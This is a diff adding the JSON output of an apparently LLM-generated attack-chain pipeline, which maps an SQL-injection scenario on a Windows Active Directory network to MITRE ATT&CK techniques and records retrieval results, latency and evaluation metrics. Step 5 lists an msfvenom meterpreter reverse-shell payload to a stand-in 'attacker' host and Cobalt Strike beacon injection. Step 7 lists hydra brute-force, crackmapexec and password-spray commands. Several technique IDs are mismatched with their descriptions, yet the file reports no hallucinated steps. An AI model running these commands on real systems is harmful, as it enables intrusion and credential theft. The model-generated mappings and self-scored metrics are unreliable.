@@ -1,0 +1,263 @@
+{
+  "attack_chain": {
+    "attack_chain": [
+      {
+        "step": 1,
+        "technique_id": "T1210",
+        "technique_name": "",
+        "tactic": "initial-access",
+        "description": "Exploit Public-Facing Application to gain initial access to the target system.",
+        "rationale": "",
+        "prerequisites": [],
+        "detection_considerations": "",
+        "mitigation": "General Best Practices: Apply defense-in-depth principles: network segmentation, least-privilege access, endpoint detection and response (EDR), security awareness training, regular patching, and monitoring.",
+        "tool_commands": []
+      },
+      {
+        "step": 2,
+        "technique_id": "T1596.005",
+        "technique_name": "",
+        "tactic": "reconnaissance",
+        "description": "Scan Databases to identify potential vulnerabilities and sensitive data.",
+        "rationale": "",
+        "prerequisites": [],
+        "detection_considerations": "",
+        "mitigation": "General Best Practices: Apply defense-in-depth principles: network segmentation, least-privilege access, endpoint detection and response (EDR), security awareness training, regular patching, and monitoring.",
+        "tool_commands": []
+      },
+      {
+        "step": 3,
+        "technique_id": "T1505.001",
+        "technique_name": "",
+        "tactic": "execution",
+        "description": "Use SQL Stored Procedures to inject malicious SQL code and execute it on the database.",
+        "rationale": "",
+        "prerequisites": [],
+        "detection_considerations": "",
+        "mitigation": "General Best Practices: Apply defense-in-depth principles: network segmentation, least-privilege access, endpoint detection and response (EDR), security awareness training, regular patching, and monitoring.",
+        "tool_commands": []
+      },
+      {
+        "step": 4,
+        "technique_id": "T1659",
+        "technique_name": "",
+        "tactic": "execution",
+        "description": "Inject malicious content into the database to manipulate user input and escalate privileges.",
+        "rationale": "",
+        "prerequisites": [],
+        "detection_considerations": "",
+        "mitigation": "General Best Practices: Apply defense-in-depth principles: network segmentation, least-privilege access, endpoint detection and response (EDR), security awareness training, regular patching, and monitoring.",
+        "tool_commands": []
+      },
+      {
+        "step": 5,
+        "technique_id": "T1055",
+        "technique_name": "",
+        "tactic": "execution",
+        "description": "Use Process Injection to inject malicious code into a legitimate process and execute it on the system.",
+        "rationale": "",
+        "prerequisites": [],
+        "detection_considerations": "",
+        "mitigation": "Behavior Prevention on Endpoint: Deploy EDR with memory protection capabilities. Enable Windows Credential Guard. Monitor for suspicious process injection APIs (WriteProcessMemory, NtMapViewOfSection).",
+        "tool_commands": [
+          "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=443 -f raw | inject_into_process",
+          "cobalt_strike: inject -> pick process -> beacon"
+        ]
+      },
+      {
+        "step": 6,
+        "technique_id": "T1584.004",
+        "technique_name": "",
+        "tactic": "lateral-movement",
+        "description": "Use Server Message Block (SMB) to move laterally within the network and access other systems.",
+        "rationale": "",
+        "prerequisites": [],
+        "detection_considerations": "",
+        "mitigation": "General Best Practices: Apply defense-in-depth principles: network segmentation, least-privilege access, endpoint detection and response (EDR), security awareness training, regular patching, and monitoring.",
+        "tool_commands": []
+      },
+      {
+        "step": 7,
+        "technique_id": "T1078",
+        "technique_name": "",
+        "tactic": "credential-access",
+        "description": "Use the compromised database credentials to access other systems and escalate privileges.",
+        "rationale": "",
+        "prerequisites": [],
+        "detection_considerations": "",
+        "mitigation": "Multi-factor Authentication: Enforce MFA for all remote access and privileged accounts. Monitor for anomalous login patterns, impossible travel, and credential stuffing.",
+        "tool_commands": [
+          "hydra -l admin -P passwords.txt rdp://target",
+          "crackmapexec smb 10.0.0.0/24 -u user -p password",
+          "spray.sh -smb 10.0.0.0/24 user passwords.txt"
+        ]
+      },
+      {
+        "step": 8,
+        "technique_id": "T1674",
+        "technique_name": "",
+        "tactic": "credential-access",
+        "description": "Use Input Injection to inject malicious input into the system and access sensitive data.",
+        "rationale": "",
+        "prerequisites": [],
+        "detection_considerations": "",
+        "mitigation": "General Best Practices: Apply defense-in-depth principles: network segmentation, least-privilege access, endpoint detection and response (EDR), security awareness training, regular patching, and monitoring.",
+        "tool_commands": []
+      },
+      {
+        "step": 9,
+        "technique_id": "T1659",
+        "technique_name": "",
+        "tactic": "persistence",
+        "description": "Use Content Injection to inject malicious content into the system and maintain persistence.",
+        "rationale": "",
+        "prerequisites": [],
+        "detection_considerations": "",
+        "mitigation": "General Best Practices: Apply defense-in-depth principles: network segmentation, least-privilege access, endpoint detection and response (EDR), security awareness training, regular patching, and monitoring.",
+        "tool_commands": []
+      },
+      {
+        "step": 10,
+        "technique_id": "T1584.004",
+        "technique_name": "",
+        "tactic": "persistence",
+        "description": "Use Server Message Block (SMB) to maintain persistence on the system and access sensitive data.",
+        "rationale": "",
+        "prerequisites": [],
+        "detection_considerations": "",
+        "mitigation": "General Best Practices: Apply defense-in-depth principles: network segmentation, least-privilege access, endpoint detection and response (EDR), security awareness training, regular patching, and monitoring.",
+        "tool_commands": []
+      }
+    ],
+    "metadata": {}
+  },
+  "retrieval_results": [
+    {
+      "technique_id": "T1596.005",
+      "name": "Scan Databases",
+      "relevance_score": 0.3343,
+      "tactics": [
+        "reconnaissance"
+      ],
+      "description": "Adversaries may search within public scan databases for information about victims that can be used during targeting. Various online services continuously publish the results of Internet scans/surveys,"
+    },
+    {
+      "technique_id": "T1584.004",
+      "name": "Server",
+      "relevance_score": 0.3212,
+      "tactics": [
+        "resource-development"
+      ],
+      "description": "Adversaries may compromise third-party servers that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, advers"
+    },
+    {
+      "technique_id": "T1659",
+      "name": "Content Injection",
+      "relevance_score": 0.3557,
+      "tactics": [
+        "initial-access",
+        " command-and-control"
+      ],
+      "description": "Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hoste"
+    },
+    {
+      "technique_id": "T1674",
+      "name": "Input Injection",
+      "relevance_score": 0.3966,
+      "tactics": [
+        "execution"
+      ],
+      "description": "Adversaries may simulate keystrokes on a victim’s computer by various means to perform any type of action on behalf of the user, such as launching the command interpreter using keyboard shortcuts, typ"
+    },
+    {
+      "technique_id": "T1505.001",
+      "name": "SQL Stored Procedures",
+      "relevance_score": 0.4677,
+      "tactics": [
+        "persistence"
+      ],
+      "description": "Adversaries may abuse SQL stored procedures to establish persistent access to systems. SQL Stored Procedures are code that can be saved and reused so that database users do not waste time rewriting fr"
+    },
+    {
+      "technique_id": "T1055",
+      "name": "Process Injection",
+      "relevance_score": 0.4173,
+      "tactics": [
+        "defense-evasion",
+        " privilege-escalation"
+      ],
+      "description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address spa"
+    },
+    {
+      "technique_id": "T1055.004",
+      "name": "Asynchronous Procedure Call",
+      "relevance_score": 0.3767,
+      "tactics": [
+        "defense-evasion",
+        " privilege-escalation"
+      ],
+      "description": "Adversaries may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges. APC injection is a"
+    },
+    {
+      "technique_id": "T1210",
+      "name": "Exploitation of Remote Services",
+      "relevance_score": 0.3382,
+      "tactics": [
+        "lateral-movement"
+      ],
+      "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a"
+    }
+  ],
+  "latency": {
+    "pipeline_start": 243875.9817187,
+    "retrieval_time_s": 0.04695689998334274,
+    "augmentation_time_s": 0.0023385999957099557,
+    "llm_request_start": 243878.6135331,
+    "llm_model": "llama-3.1-8b-instant",
+    "prompt_chars": 2859,
+    "llm_request_end": 243881.321777,
+    "llm_latency_s": 2.708243900007801,
+    "eval_count": 1169,
+    "eval_duration_ns": 0,
+    "tokens_per_second": 431.64502281224844,
+    "validation_time_s": 5.304597200010903,
+    "pipeline_total_s": 5.366664600005606
+  },
+  "warnings": [],
+  "faithfulness_score": 0.9,
+  "scenario": "sql injections",
+  "target_environment": "Enterprise Windows Active Directory network",
+  "timestamp": "2026-05-04T09:41:26.241191+00:00",
+  "analysis": {
+    "total_steps": 10,
+    "unique_techniques": 8,
+    "technique_reuse": 2,
+    "tactical_coverage": {
+      "covered": [
+        "credential-access",
+        "execution",
+        "initial-access",
+        "lateral-movement",
+        "persistence",
+        "reconnaissance"
+      ],
+      "total_mitre_tactics": 14,
+      "coverage_ratio": 0.42857142857142855
+    },
+    "detection_coverage": {
+      "steps_with_detection": 0,
+      "coverage_ratio": 0.0
+    },
+    "hallucination_metrics": {
+      "hallucinated_steps": 0,
+      "total_steps": 10,
+      "faithfulness_score": 0.9
+    },
+    "latency_summary": {
+      "total_pipeline_s": 5.366664600005606,
+      "retrieval_ms": 46.95689998334274,
+      "generation_s": 2.708243900007801,
+      "tokens_per_second": 431.64502281224844
+    }
+  }
+}
